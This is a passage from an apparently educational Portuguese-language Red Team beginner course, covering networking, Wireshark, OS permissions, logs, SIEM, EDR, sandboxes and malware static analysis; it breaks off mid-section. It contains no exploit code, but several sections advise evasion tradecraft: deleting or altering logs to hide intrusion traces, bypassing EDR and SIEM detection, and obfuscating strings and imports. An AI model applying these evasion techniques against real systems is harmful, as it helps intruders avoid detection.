+Para iniciar sua jornada no Red Team, é fundamental construir uma base sólida com conteúdos introdutórios que abordem os conceitos essenciais de segurança da informação. Cursos online e vídeos no YouTube são ótimas formas de absorver o conhecimento de forma acessível e prática.
+
+Comece com o básico para construir seu futuro.
+
+---
+
+ 🧠 Por que começar com cursos introdutórios?
+
+- Explicam conceitos fundamentais e terminologias  
+- Apresentam cenários reais e exemplos práticos  
+- Fornecem estrutura para aprofundar estudos futuros  
+- Facilitam o entendimento de segurança ofensiva e defensiva  
+
+---
+
+ 🧱 Sugestões de materiais iniciais
+
+ 1. Cursos introdutórios
+
+- **“Cybersecurity Basics”** – curso gratuito disponível em plataformas como Coursera, Udemy ou Cybrary  
+- **“Introduction to Cyber Security”** da Cisco Networking Academy  
+- **“Fundamentals of Cybersecurity”** no edX  
+
+ 2. Canais do YouTube
+
+- **NetworkChuck** – explica desde o básico até tópicos avançados de segurança e redes  
+- **The Cyber Mentor** – conteúdo prático voltado para Red Team e pentesting  
+- **HackerSploit** – tutoriais sobre hacking ético, segurança e ferramentas  
+
+---
+
+ 🔍 Dicas para aproveitar o material
+
+```
+- Faça anotações e revise os conteúdos periodicamente  
+- Pratique o que aprendeu em laboratórios virtuais e VMs  
+- Combine vídeos com leitura complementar para fixar o conhecimento  
+- Participe de comunidades para tirar dúvidas e trocar experiências  
+```
+
+---
+
+ ✅ Conclusão
+
+Utilizar cursos introdutórios e vídeos do YouTube é uma excelente maneira de iniciar sua trajetória no Red Team. O aprendizado constante e a prática farão a diferença para sua evolução profissional.
+
+---
+
+ 🔴 Red Team N1: Estudo Detalhado dos Modelos OSI e TCP/IP
+
+Dominar os modelos OSI e TCP/IP é fundamental para qualquer profissional de Red Team. Compreender as camadas que estruturam as redes ajuda a identificar pontos de ataque, analisar tráfego e explorar vulnerabilidades com maior precisão.
+
+Conhecimento profundo da rede é chave para um ataque eficaz.
+
+---
+
+ 🧠 O que são os modelos OSI e TCP/IP?
+
+- **Modelo OSI:** referência teórica que divide a comunicação em 7 camadas distintas  
+- **Modelo TCP/IP:** modelo prático usado na internet, com 4 camadas principais  
+- Ambos ajudam a entender como os dados transitam e onde atacar ou defender  
+
+---
+
+ 🧱 Detalhes das camadas
+
+ Modelo OSI (7 camadas)
+
+1. **Física:** transmissão de bits brutos (cabos, sinais elétricos)  
+2. **Enlace:** controle de acesso ao meio e detecção de erros (MAC, switches)  
+3. **Rede:** roteamento e endereçamento (IP)  
+4. **Transporte:** controle de fluxo e entrega confiável (TCP, UDP)  
+5. **Sessão:** controle de conexões e sessões  
+6. **Apresentação:** formatação, criptografia e compressão  
+7. **Aplicação:** protocolos finais como HTTP, FTP, DNS  
+
+ Modelo TCP/IP (4 camadas)
+
+1. **Link:** equivalente a física + enlace  
+2. **Internet:** roteamento (IP)  
+3. **Transporte:** TCP/UDP  
+4. **Aplicação:** protocolos e serviços (HTTP, DNS, SMTP)  
+
+---
+
+ 🔍 Como aplicar no Red Team
+
+```
+- Identificar em qual camada o alvo pode ser explorado (ex: injeção na aplicação, spoofing na rede)  
+- Analisar tráfego capturado para detectar anomalias  
+- Explorar falhas específicas em protocolos de cada camada  
+- Planejar ataques combinando múltiplas camadas para maior eficácia  
+```
+
+---
+
+ ⚙️ Ferramentas úteis para estudo
+
+- Wireshark para análise de pacotes  
+- tcpdump para captura em linha de comando  
+- Ferramentas de mapeamento de rede como nmap  
+- Simuladores de redes e laboratórios virtuais  
+
+---
+
+ ✅ Conclusão
+
+Estudar os modelos OSI e TCP/IP detalhadamente é um passo essencial para se tornar um Red Team eficaz. Com esse conhecimento, você entenderá melhor o funcionamento das redes e poderá identificar e explorar vulnerabilidades com mais precisão.
+
+---
+
+ 🔴 Red Team N1: Entendendo Protocolos TCP, UDP e ICMP
+
+Para um Red Team eficaz, conhecer como funcionam os principais protocolos de rede é essencial. TCP, UDP e ICMP são protocolos fundamentais usados para comunicação entre dispositivos e, também, vetores comuns em técnicas de ataque e reconhecimento.
+
+Domine esses protocolos para mapear e explorar alvos com eficiência.
+
+---
+
+ 🧠 O que são TCP, UDP e ICMP?
+
+- **TCP (Transmission Control Protocol):** protocolo orientado à conexão, confiável e que garante entrega dos dados  
+- **UDP (User Datagram Protocol):** protocolo sem conexão, rápido e sem garantia de entrega, usado para transmissões rápidas  
+- **ICMP (Internet Control Message Protocol):** protocolo para troca de mensagens de controle e diagnóstico na rede  
+
+---
+
+ 🧱 Características principais
+
+ TCP
+
+- Estabelece conexão via handshake de 3 vias (SYN, SYN-ACK, ACK)  
+- Controle de fluxo e retransmissão de pacotes perdidos  
+- Usado por protocolos como HTTP, FTP, SMTP  
+- Ataques comuns: TCP SYN Flood (DoS), hijacking de sessão  
+
+ UDP
+
+- Comunicação sem conexão e sem confirmação de entrega  
+- Usado para DNS, VoIP, streaming  
+- Menor overhead, mas maior chance de perda de pacotes  
+- Ataques comuns: UDP Flood, reflexão/amplificação  
+
+ ICMP
+
+- Utilizado para mensagens de erro e teste (ping, traceroute)  
+- Fundamental para diagnóstico e manutenção da rede  
+- Ataques comuns: ICMP Flood (ping flood), ICMP redirect  
+
+---
+
+ 🔍 Exemplos práticos
+
+```
+- TCP: usar nmap para detectar portas TCP abertas no alvo  
+- UDP: realizar scan UDP para identificar serviços em execução  
+- ICMP: ping para verificar se o host está ativo e responder a testes  
+```
+
+---
+
+ ⚙️ Aplicação no Red Team
+
+- Use TCP para exploração de serviços com conexão garantida  
+- Explore UDP para identificar serviços rápidos e menos protegidos  
+- Utilize ICMP para mapeamento inicial e evasão de firewall  
+- Combine varreduras com análise dos protocolos para planejar ataques precisos  
+
+---
+
+ ✅ Conclusão
+
+Compreender os protocolos TCP, UDP e ICMP é fundamental para um Red Team N1 planejar e executar ataques efetivos. O domínio desses protocolos ajuda a identificar superfícies de ataque e a evitar detecção durante operações ofensivas.
+
+---
+
+ 🔴 Red Team N1: Ferramenta Wireshark – Captura e Análise Simples de Pacotes
+
+Para um Red Team eficiente, entender o tráfego de rede é essencial. O Wireshark é uma das ferramentas mais poderosas e populares para capturar e analisar pacotes de rede, permitindo identificar comunicações, protocolos e potenciais vulnerabilidades.
+
+Use o Wireshark para enxergar o que passa pela rede.
+
+---
+
+ 🧠 O que é o Wireshark?
+
+- Ferramenta de código aberto para captura e análise de tráfego de rede  
+- Suporta centenas de protocolos e formatos diferentes  
+- Permite filtragem e inspeção detalhada de pacotes capturados  
+- Fundamental para investigação, diagnóstico e pentests  
+
+---
+
+ 🧱 Funcionalidades básicas
+
+- Captura ao vivo do tráfego da interface de rede  
+- Filtros para exibir somente pacotes de interesse (ex: `tcp`, `http`)  
+- Decodificação dos protocolos para leitura humana  
+- Estatísticas e gráficos para análise do comportamento da rede  
+
+---
+
+ 🔍 Passos simples para começar
+
+```
+1. Inicie o Wireshark e selecione a interface de rede para captura  
+2. Use filtros básicos para focar no tráfego desejado (ex: `ip.addr == 192.168.1.10`)  
+3. Analise os pacotes capturados, observando origem, destino e protocolo  
+4. Utilize a função “Follow TCP Stream” para ver a conversa completa  
+```
+
+---
+
+ ⚙️ Aplicação no Red Team
+
+- Identificar serviços ativos e protocolos usados no alvo  
+- Capturar dados que possam conter credenciais ou informações sensíveis  
+- Analisar respostas a ataques de rede para ajustar estratégias  
+- Detectar anomalias ou comportamento suspeito no tráfego  
+
+---
+
+ ✅ Conclusão
+
+Dominar o Wireshark permite ao Red Team N1 obter uma visão clara do tráfego de rede, fundamental para reconhecimento, exploração e pós-exploração. Comece simples, evolua para análises mais complexas e use essa ferramenta para maximizar seu impacto ofensivo.
+
+---
+
+ 🔴 Red Team N1: Prática – Capturar Tráfego da Rede e Analisar Conexões Básicas
+
+A melhor forma de aprender sobre redes e segurança ofensiva é colocando a mão na massa. Capturar e analisar o tráfego da sua rede local ajuda a entender o funcionamento dos protocolos e identificar padrões de comunicação.
+
+Vamos praticar!
+
+---
+
+ 🧠 Objetivo da prática
+
+- Capturar pacotes de rede em tempo real  
+- Identificar conexões básicas entre dispositivos  
+- Reconhecer protocolos e padrões comuns  
+- Preparar o terreno para análises mais complexas  
+
+---
+
+ 🧱 Passos para a captura e análise
+
+ 1. Preparar o ambiente
+
+- Use Wireshark instalado na sua máquina ou em uma VM  
+- Certifique-se de ter permissões para capturar tráfego na interface de rede  
+
+ 2. Capturar o tráfego
+
+- Abra o Wireshark e selecione a interface correta (ex: Wi-Fi, Ethernet)  
+- Inicie a captura de pacotes ao vivo  
+
+ 3. Filtrar conexões básicas
+
+- Use filtros simples para focar em conexões comuns:  
+  - `tcp` para tráfego TCP  
+  - `udp` para tráfego UDP  
+  - `icmp` para mensagens de controle  
+- Observe endereços IP, portas e protocolos  
+
+ 4. Analisar conexões
+
+- Clique em pacotes individuais para ver detalhes  
+- Use “Follow TCP Stream” para entender conversas completas  
+- Identifique serviços acessados (ex: HTTP, DNS)  
+
+---
+
+ 🔍 Dicas para a análise
+
+```
+- Observe padrões repetitivos que indiquem serviços ativos  
+- Identifique fluxos de dados entre seu dispositivo e servidores externos  
+- Procure por tráfego não usual ou desconhecido  
+- Registre insights para melhorar seus ataques ou defesas futuras  
+```
+
+---
+
+ ✅ Conclusão
+
+Praticar a captura e análise de tráfego básico é essencial para qualquer Red Team N1. Essa habilidade permite entender o comportamento da rede e planejar ataques mais eficazes com base em evidências reais.
+
+---
+
+ 🔴 Red Team N1: Conceitos Básicos de Sistemas Windows e Linux – Arquivos, Permissões e Processos
+
+Para atuar com eficiência em Red Team, é fundamental entender como funcionam os sistemas operacionais Windows e Linux, especialmente no que diz respeito ao gerenciamento de arquivos, permissões e processos. Esse conhecimento permite explorar vulnerabilidades e controlar sistemas de forma eficaz.
+
+Conheça a base para suas operações ofensivas.
+
+---
+
+ 🧠 Fundamentos dos sistemas operacionais
+
+- Windows e Linux são os sistemas mais comuns em ambientes corporativos  
+- Cada um tem estrutura própria para arquivos, permissões e gerenciamento de processos  
+- Saber navegar e manipular esses elementos é essencial para exploração e pós-exploração  
+
+---
+
+ 🧱 Arquivos
+
+ Windows
+
+- Arquivos organizados em pastas e unidades (C:\, D:\)  
+- Extensões indicam o tipo (ex: .exe, .dll, .txt)  
+- Atributos como oculto, sistema e somente leitura  
+
+ Linux
+
+- Arquivos e diretórios organizados em uma árvore única iniciando no `/`  
+- Sem extensões obrigatórias, mas convencionais (ex: .sh, .conf)  
+- Tipos variados: arquivos regulares, diretórios, links simbólicos, dispositivos  
+
+---
+
+ 🧱 Permissões
+
+ Windows
+
+- Controle via ACL (Access Control Lists)  
+- Permissões principais: leitura, escrita, execução  
+- Herança e propagação de permissões em pastas  
+
+ Linux
+
+- Permissões básicas para dono, grupo e outros (rwx)  
+- Representadas por bits e símbolos (ex: `rwxr-xr--`)  
+- Comandos para gerenciar: `chmod`, `chown`, `chgrp`  
+
+---
+
+ 🧱 Processos
+
+ Windows
+
+- Gerenciador de tarefas mostra processos e serviços  
+- Processos podem ser iniciados por usuário ou sistema  
+- Ferramentas para análise: Task Manager, Process Explorer  
+
+ Linux
+
+- Processos gerenciados via PID (Process ID)  
+- Comandos comuns: `ps`, `top`, `kill`  
+- Hierarquia de processos e uso de sinais para controle  
+
+---
+
+ 🔍 Exemplos práticos
+
+```
+- Windows: verificar permissões de um arquivo via propriedades  
+- Linux: usar `ls -l` para listar permissões de arquivos  
+- Analisar processos ativos com Task Manager (Windows) e `top` (Linux)  
+```
+
+---
+
+ ⚙️ Aplicação no Red Team
+
+- Explorar permissões incorretas para escalonamento de privilégios  
+- Identificar processos críticos para manipulação ou injeção de código  
+- Navegar e manipular arquivos para persistência e exfiltração  
+- Usar comandos nativos para evitar detecção em ambientes monitorados  
+
+---
+
+ ✅ Conclusão
+
+Dominar os conceitos básicos de arquivos, permissões e processos em Windows e Linux é indispensável para o Red Team N1. Com essa base, você pode planejar ataques mais eficientes e furtivos, aproveitando as particularidades de cada sistema.
+
+---
+
+ 🔴 Red Team N1: Onde Encontrar Logs no Windows e Linux – Event Viewer e /var/log
+
+Analisar logs é uma das principais atividades no Red Team para entender o que aconteceu em um sistema, identificar atividades suspeitas e planejar movimentos furtivos. Conhecer os locais e ferramentas para acessar logs é essencial para qualquer profissional.
+
+Saiba onde os sistemas guardam seus rastros.
+
+---
+
+ 🧠 Importância dos logs
+
+- Documentam eventos, erros, acessos e atividades do sistema  
+- São fontes valiosas para identificar comportamentos anormais  
+- Ferramentas de defesa usam logs para detectar e alertar sobre ameaças  
+
+---
+
+ 🧱 Logs no Windows
+
+- **Event Viewer** (Visualizador de Eventos) é a ferramenta padrão para acessar logs  
+- Principais categorias:  
+  - **Application:** eventos de aplicativos instalados  
+  - **Security:** logs de segurança (login, falhas, auditoria)  
+  - **System:** eventos do sistema operacional e drivers  
+- Logs ficam armazenados em arquivos `.evtx` no sistema  
+
+---
+
+ 🧱 Logs no Linux
+
+- Diretório padrão: `/var/log/`  
+- Principais arquivos e diretórios:  
+  - `syslog` ou `messages`: logs gerais do sistema  
+  - `auth.log` ou `secure`: logs de autenticação e sudo  
+  - `kern.log`: mensagens do kernel  
+  - `dmesg`: buffer do kernel, informações de hardware  
+  - Logs específicos de serviços (ex: `/var/log/apache2/`)  
+
+---
+
+ 🔍 Exemplos práticos
+
+```
+- Windows: abrir Event Viewer (`eventvwr.msc`) e navegar em Security > Logon para eventos de login  
+- Linux: usar comandos `cat /var/log/auth.log` ou `tail -f /var/log/syslog` para acompanhar logs em tempo real  
+- Filtrar logs para eventos de interesse usando filtros no Event Viewer ou `grep` no Linux  
+```
+
+---
+
+ ⚙️ Aplicação no Red Team
+
+- Revisar logs para identificar pontos de detecção e evitar alertas  
+- Apagar ou modificar logs para ocultar rastros após invasão (com cuidado e ética)  
+- Monitorar logs para identificar falhas e oportunidades de escalonamento  
+- Entender o padrão normal para detectar anomalias em testes ofensivos  
+
+---
+
+ ✅ Conclusão
+
+Saber onde encontrar e como analisar logs no Windows e Linux é uma habilidade crítica para o Red Team N1. O domínio dessas fontes ajuda a mapear sistemas, planejar ataques e entender respostas dos alvos.
+
+---
+
+ 🔴 Red Team N1: Como Interpretar Logs Comuns – Login e Eventos de Segurança
+
+Interpretar logs é uma habilidade essencial para entender o comportamento de sistemas e identificar atividades suspeitas durante testes de Red Team. Logs de login e eventos de segurança são fontes ricas para detectar tentativas de acesso, falhas e possíveis invasões.
+
+Aprenda a ler os sinais que os sistemas deixam.
+
+---
+
+ 🧠 Por que interpretar logs?
+
+- Revela tentativas de acesso legítimas e maliciosas  
+- Ajuda a detectar padrões anormais e ataques em andamento  
+- Fornece evidências para análise forense e planejamento de ataques futuros  
+
+---
+
+ 🧱 Logs comuns para analisar
+
+ 1. Logs de Login
+
+- Indicam quando e por quem um usuário acessou o sistema  
+- Informações típicas: usuário, horário, endereço IP, sucesso ou falha  
+- Atenção a falhas repetidas, logins fora do horário ou de locais incomuns  
+
+ 2. Eventos de Segurança
+
+- Incluem alterações em permissões, execução de comandos críticos, criação de contas  
+- Alertam para atividades suspeitas, como tentativas de escalonamento ou acesso privilegiado  
+- Monitorar eventos de auditoria e acesso a arquivos sensíveis  
+
+---
+
+ 🔍 Exemplos práticos de interpretação
+
+```
+- Login falho repetido pode indicar ataque de força bruta  
+- Login bem-sucedido de usuário desconhecido ou fora do horário normal  
+- Modificações em contas administrativas sem autorização  
+- Execução de comandos incomuns em horários atípicos  
+```
+
+---
+
+ ⚙️ Dicas para análise eficiente
+
+- Use ferramentas para filtrar e correlacionar eventos  
+- Entenda o padrão normal de operação para identificar anomalias  
+- Combine análise de diferentes logs para contexto completo  
+- Documente descobertas para informar a equipe e ajustar ataques  
+
+---
+
+ ✅ Conclusão
+
+Interpretar logs de login e eventos de segurança é uma competência chave para o Red Team N1. Saber identificar sinais de acesso e atividades suspeitas permite ajustar estratégias ofensivas e evitar detecção.
+
+---
+
+ 🔴 Red Team N1: Prática – Analisar Logs Locais e Buscar Atividades Suspeitas
+
+Colocar a teoria em prática é fundamental para aprimorar suas habilidades no Red Team. Analisar logs locais ajuda a identificar padrões anormais e atividades maliciosas que podem indicar invasões ou tentativas de ataque.
+
+Vamos treinar a caça aos sinais!
+
+---
+
+ 🧠 Objetivo da prática
+
+- Examinar logs de sistemas Windows e Linux  
+- Identificar eventos fora do padrão e suspeitos  
+- Entender como reconhecer ataques e comportamentos maliciosos  
+- Desenvolver rotina de análise para uso em testes e investigações  
+
+---
+
+ 🧱 Passos para análise
+
+ 1. Preparar o ambiente
+
+- Acesse a máquina alvo (física ou VM) com permissões adequadas  
+- Para Windows, use o Event Viewer; para Linux, acesse arquivos em `/var/log/`  
+
+ 2. Coletar logs relevantes
+
+- Windows: focar em logs de segurança, sistema e aplicação  
+- Linux: analisar `auth.log`, `syslog`, `kern.log` e logs específicos de serviços  
+
+ 3. Buscar atividades suspeitas
+
+- Falhas repetidas de login  
+- Acessos em horários incomuns  
+- Criação ou alteração de usuários e permissões  
+- Execução de comandos ou serviços não autorizados  
+
+ 4. Documentar e correlacionar
+
+- Anote eventos importantes e timestamps  
+- Correlacione com outras fontes e comportamentos observados  
+- Gere relatórios simples para consolidar a análise  
+
+---
+
+ 🔍 Exemplos de comandos e ações
+
+```
+- Windows: usar filtros no Event Viewer para “Logon Failure” e eventos críticos  
+- Linux: comandos como `grep "failed" /var/log/auth.log` e `tail -f /var/log/syslog`  
+- Procurar por eventos que indiquem escalonamento de privilégios ou movimentação lateral  
+```
+
+---
+
+ ✅ Conclusão
+
+Praticar a análise de logs locais e identificar atividades suspeitas fortalece a capacidade do Red Team N1 de detectar e explorar falhas. Essa rotina é essencial para testes mais precisos e para aprimorar sua visão ofensiva.
+
+---
+
+ 🔴 Red Team N1: Introdução a SIEM – Conceitos e Uso Básico (Splunk, Elastic Stack)
+
+SIEM (Security Information and Event Management) é uma tecnologia fundamental para a segurança corporativa, agregando, correlacionando e analisando logs e eventos de múltiplas fontes. Para o Red Team, entender o funcionamento do SIEM ajuda a planejar ataques que evadem ou manipulam esses sistemas.
+
+Conheça a ferramenta que os defensores usam para detectar você.
+
+---
+
+ 🧠 O que é SIEM?
+
+- Plataforma que coleta e centraliza logs de sistemas, redes e aplicações  
+- Correlaciona eventos para identificar ameaças e anomalias  
+- Gera alertas e dashboards para monitoramento em tempo real  
+- Exemplos populares: **Splunk**, **Elastic Stack (ELK)**, IBM QRadar  
+
+---
+
+ 🧱 Componentes principais
+
+- **Coleta de dados:** agentes ou métodos que enviam logs para o SIEM  
+- **Armazenamento:** banco de dados otimizado para grandes volumes de dados  
+- **Análise:** correlação, busca e visualização de eventos  
+- **Resposta:** alertas automáticos e integração com sistemas de resposta  
+
+---
+
+ 🔍 Uso básico para Red Team
+
+```
+- Entender quais tipos de logs e eventos o SIEM monitora no ambiente alvo  
+- Conhecer regras e padrões de detecção para evitar alertas durante ataques  
+- Testar técnicas de evasão baseadas em manipulação de logs e eventos  
+- Monitorar dashboards públicos para aprender sobre alertas comuns  
+```
+
+---
+
+ ⚙️ Exemplos práticos de SIEMs populares
+
+- **Splunk:** interface web intuitiva, poderosa busca e análise em tempo real  
+- **Elastic Stack:** conjunto open source (Elasticsearch, Logstash, Kibana) para coleta e visualização  
+- Integração com várias fontes e APIs para automação de respostas  
+
+---
+
+ ✅ Conclusão
+
+Para o Red Team N1, conhecer o conceito e uso básico de SIEMs como Splunk e Elastic Stack é vital para planejar ataques furtivos e eficazes. Dominar essas ferramentas auxilia na compreensão das defesas e na criação de estratégias mais avançadas.
+
+---
+
+ 🔴 Red Team N1: Uso de EDR – Endpoint Detection and Response
+
+EDR (Endpoint Detection and Response) é uma tecnologia avançada que monitora e coleta dados dos endpoints (dispositivos finais) para detectar, investigar e responder a ameaças em tempo real. Para o Red Team, entender como o EDR funciona é essencial para planejar ataques que evadem ou contornam essas defesas.
+
+Conheça o guardião dos endpoints para melhorar sua estratégia ofensiva.
+
+---
+
+ 🧠 O que é EDR?
+
+- Solução focada em detectar atividades suspeitas nos endpoints  
+- Coleta dados detalhados de processos, arquivos, rede e comportamento  
+- Fornece alertas, análises forenses e respostas automáticas ou manuais  
+- Exemplos populares: CrowdStrike Falcon, Carbon Black, Microsoft Defender for Endpoint  
+
+---
+
+ 🧱 Principais funcionalidades
+
+- Monitoramento contínuo de endpoints  
+- Detecção de ameaças baseada em comportamento e assinaturas  
+- Análise automatizada e manual de incidentes  
+- Resposta rápida: isolamento, bloqueio de processos e remoção de ameaças  
+
+---
+
+ 🔍 Como o Red Team pode usar esse conhecimento
+
+```
+- Entender as técnicas comuns que EDRs detectam para evitar alertas  
+- Testar ferramentas e métodos para desativar ou burlar EDRs (com ética e autorização)  
+- Analisar os logs e alertas gerados para ajustar ataques futuros  
+- Simular ataques reais considerando a presença do EDR para treino da equipe Blue Team  
+```
+
+---
+
+ ⚙️ Exemplos práticos
+
+- Reconhecer comportamentos que disparam alertas (ex: execução de payloads, elevação de privilégios)  
+- Utilizar técnicas de “living off the land” para minimizar rastros  
+- Avaliar os mecanismos de resposta automática para evitar isolamento do endpoint  
+
+---
+
+ ✅ Conclusão
+
+Compreender o uso e funcionamento do EDR é crucial para o Red Team N1 que deseja planejar ataques furtivos e eficazes. Esse conhecimento permite antecipar defesas e explorar brechas para maximizar o sucesso ofensivo.
+
+---
+
+ 🔴 Red Team N1: Ferramentas de Sandbox para Análise de Malware – AnyRun e Hybrid Analysis
+
+Para o Red Team, entender como funcionam as sandboxes é fundamental para analisar amostras de malware e antecipar as estratégias do adversário. Ferramentas como AnyRun e Hybrid Analysis permitem executar arquivos suspeitos em ambientes controlados, revelando comportamentos maliciosos.
+
+Use essas ferramentas para ampliar sua visão ofensiva.
+
+---
+
+ 🧠 O que são sandboxes?
+
+- Ambientes isolados que executam códigos suspeitos com segurança  
+- Monitoram ações do malware: arquivos criados, conexões de rede, processos, modificações no sistema  
+- Geram relatórios detalhados para análise técnica e inteligência  
+
+---
+
+ 🧱 Ferramentas populares
+
+ 1. AnyRun
+
+- Sandbox interativa online  
+- Permite execução e monitoramento em tempo real  
+- Interface amigável para análises manuais e colaborativas  
+- Útil para análises rápidas e demonstrações  
+
+🔗 [https://any.run/](https://any.run/)
+
+ 2. Hybrid Analysis
+
+- Sandbox mantida pela CrowdStrike  
+- Análise automática com múltiplas engines e heurísticas  
+- Relatórios detalhados com indicadores técnicos e comportamento  
+- Suporta vários tipos de arquivos, incluindo scripts e documentos  
+
+🔗 [https://www.hybrid-analysis.com/](https://www.hybrid-analysis.com/)
+
+---
+
+ 🔍 Como o Red Team pode usar?
+
+```
+- Entender técnicas usadas por malwares para evitar detecção  
+- Analisar amostras próprias para testar defesas e estratégias  
+- Criar payloads personalizados inspirados em comportamentos observados  
+- Preparar relatórios para compartilhar conhecimento com a equipe  
+```
+
+---
+
+ ✅ Conclusão
+
+Dominar o uso de sandboxes como AnyRun e Hybrid Analysis permite ao Red Team N1 ampliar sua capacidade de análise e desenvolvimento de técnicas ofensivas. Essas ferramentas são aliados valiosos para quem quer entender o comportamento real dos malwares.
+
+---
+
+ 🔴 Red Team N1: Prática – Simular Alerta no SIEM e Investigar um Falso Positivo
+
+Para entender como sua atividade pode ser detectada (ou ignorada), é essencial praticar a simulação de alertas em um SIEM. Além disso, investigar falsos positivos ajuda a entender como os sistemas defensivos funcionam — e como podem ser enganados.
+
+Teste os limites da detecção para se tornar invisível.
+
+---
+
+ 🧠 Objetivo da prática
+
+- Criar uma atividade que dispare um alerta no SIEM  
+- Investigar o alerta como se fosse da equipe Blue  
+- Analisar se a detecção foi legítima, um falso positivo ou um erro de configuração  
+- Aprender como sua atividade ofensiva é percebida  
+
+---
+
+ 🧱 Etapas da simulação
+
+ 1. Acesse o SIEM
+
+- Pode ser um ambiente com **Splunk**, **Elastic Stack (ELK)** ou outro SIEM acessível  
+- Certifique-se de que logs de endpoints ou servidores estejam sendo coletados  
+
+ 2. Simule uma atividade
+
+- Execute uma ação que gere um evento monitorado:
+  - Múltiplas tentativas de login (para gerar alerta de brute force)  
+  - Execução de um script com `PowerShell`  
+  - Alteração de arquivos de sistema  
+
+ 3. Aguarde o alerta
+
+- Verifique se a regra de detecção foi acionada  
+- Documente a origem, tipo de evento e resposta do sistema  
+
+ 4. Investigue como se fosse Blue Team
+
+- Acesse o evento no SIEM  
+- Analise IPs, usuário, timestamps, comandos executados  
+- Determine se foi uma ameaça real ou um falso positivo  
+
+---
+
+ 🔍 O que observar
+
+```
+- Quais campos do evento foram analisados pelo SIEM?  
+- O alerta foi acionado por comportamento ou por assinatura?  
+- A ação foi maliciosa ou legítima (falso positivo)?  
+- O que poderia ser feito para evitar ou atrasar o alerta?  
+```
+
+---
+
+ ✅ Conclusão
+
+Praticar a simulação de alertas e a investigação de falsos positivos fortalece a visão do Red Team sobre como suas ações são vistas pelos defensores. Com esse conhecimento, é possível adaptar táticas para ser mais furtivo e eficaz.
+
+---
+
+ 🔴 Red Team N1: Conceitos Básicos de Análise Estática – Strings, Hashes, Import Table
+
+A análise estática é uma técnica fundamental para examinar arquivos suspeitos **sem executá-los**. Ela permite extrair informações úteis que podem revelar comportamentos maliciosos, indicadores de comprometimento e até mesmo vulnerabilidades exploráveis.
+
+Aprenda a dissecar arquivos com precisão cirúrgica.
+
+---
+
+ 🧠 O que é Análise Estática?
+
+- Análise de arquivos (geralmente executáveis) **sem execução direta**  
+- Foca em identificar padrões, strings, funções, estrutura e metadados  
+- Útil para reconhecer rapidamente funcionalidades maliciosas  
+- Complementa a análise dinâmica com dados prévios à execução  
+
+---
+
+ 🧱 Elementos Essenciais
+
+ 1. **Strings**
+
+- Texto codificado dentro de arquivos binários  
+- Podem revelar URLs, comandos, nomes de arquivos, credenciais ou mensagens ocultas  
+- Ferramentas como `strings` (Linux) ou `bintext` mostram essas informações  
+- Ajuda a identificar comportamentos maliciosos rapidamente  
+
+ 2. **Hashes**
+
+- Impressões digitais únicas de arquivos  
+- SHA256, MD5 e SHA1 são os mais usados  
+- Permitem verificar integridade, detectar variantes e buscar em bancos como VirusTotal  
+- Compara arquivos com malwares conhecidos  
+
+ 3. **Import Table (IAT)**
+
+- Lista de funções e bibliotecas que o binário usa  
+- Indica **quais APIs** do sistema o arquivo pretende usar (ex: `CreateProcess`, `InternetOpenUrl`)  
+- Forte indicador do comportamento pretendido: rede, execução, manipulação de memória  
+- Ferramentas como PEStudio e Ghidra ajudam a visualizar a IAT  
+
+---
+
+ 🔍 Aplicação prática
+
+```
+- Use `strings malware.exe > out.txt` para extrair textos suspeitos  
+- Gere um hash com `sha256sum malware.exe` e busque no VirusTotal  
+- Analise a import table com ferramentas como PEStudio para ver se há chamadas suspeitas à API  
+```
+
+---
+
+ ⚙️ Por que importa para o Red Team?
+
+- Ajudar a entender e modificar malwares (para simulações ou PoCs)  
+- Criar payloads mais eficazes e furtivos  
+- Detectar como a análise defensiva enxerga seus arquivos  
+- Preparar contra-análises: como evitar strings explícitas ou ofuscar a IAT  
+
+---
+
+ ✅ Conclusão
+
+Dominar a análise estática é um passo essencial no arsenal do Red Team N1. Com ferramentas simples e um olhar atento, você pode obter informações poderosas sem sequer executar o código malicioso.
+
+---
+
+ 🔴 Red Team N1: Introdução à Análise Dinâmica com Sandboxes
+
+A análise dinâmica permite observar **o que um arquivo realmente faz quando é executado**. Em ambientes seguros chamados sandboxes, é possível estudar malwares e payloads sem colocar em risco o sistema. Essa técnica é essencial para entender o comportamento real de ameaças.
+
+Assista o malware agir sem arriscar sua máquina.
+
+---
+
+ 🧠 O que é Análise Dinâmica?
+
+- Técnica que **executa** o arquivo em um ambiente isolado (sandbox)  
+- Permite observar ações em tempo real: criação de arquivos, conexões de rede, processos, modificações no sistema  
+- Detecta comportamento oculto ou condicional que não aparece na análise estática  
+- Ideal para capturar IOCs (hashes, IPs, domínios, strings) e verificar evasão  
+
+---
+
+ 🧱 Ferramentas Populares de Sandbox
+
+- **AnyRun:** sandbox interativa com visualização em tempo real  
+- **Hybrid Analysis:** sandbox automatizada com múltiplos mecanismos de detecção  
+- **CAPEv2:** ferramenta open source com foco em extração de payloads e comportamento de malware  
+
+---
+
+ 🔍 Como funciona a análise dinâmica
+
+```
+1. Envie o arquivo suspeito para a sandbox (via upload ou link)  
+2. A sandbox executa o arquivo em uma VM monitorada  
+3. É coletado o comportamento: arquivos criados, conexões abertas, processos chamados  
+4. O relatório mostra indicadores técnicos e insights de execução maliciosa  
+```
+
+---
+
+ ⚙️ Por que importa para o Red Team?
+
+- Avaliar se seus payloads disparam alertas comportamentais  
+- Testar estratégias de evasão: delay na execução, verificação de ambiente virtual  
+- Inspirar-se em malwares reais para desenvolver simulações mais eficazes  
+- Compreender como o Blue Team coleta evidências a partir do comportamento  
+
+---
+
+ ✅ Conclusão
+
+A análise dinâmica com sandboxes é uma ferramenta poderosa no kit do Red Team N1. Ela permite observar malwares e arquivos maliciosos em ação, revelar detalhes críticos e fortalecer o desenvolvimento de técnicas ofensivas furtivas e sofisticadas.
+
+---
+
+ 🔴 Red Team N1: Ferramentas para Análise Básica – PEStudio, x64dbg, Ghidra
+
+No Red Team, entender como funcionam arquivos executáveis é essencial. Ferramentas como **PEStudio**, **x64dbg** e **Ghidra** ajudam a fazer uma análise estática e reversa inicial de malwares e payloads, mesmo sem executar o código diretamente.
+
+Conheça o que acontece por trás do clique duplo.
+
+---
+
+ 🧠 Por que usar essas ferramentas?
+
+- Realizam **análise estática e reversa** sem executar o arquivo  
+- Permitem identificar funções suspeitas, imports, strings e estruturas internas  
+- Ajudam a entender como o malware opera e a desenvolver técnicas de evasão  
+- São base para engenharia reversa, modificação e criação de simulações  
+
+---
+
+ 🧱 Ferramentas Essenciais
+
+ 1. **PEStudio**
+
+- Ferramenta leve para análise estática de executáveis Windows (PE)  
+- Mostra imports, exports, strings, hashes, seções e indicadores de anomalias  
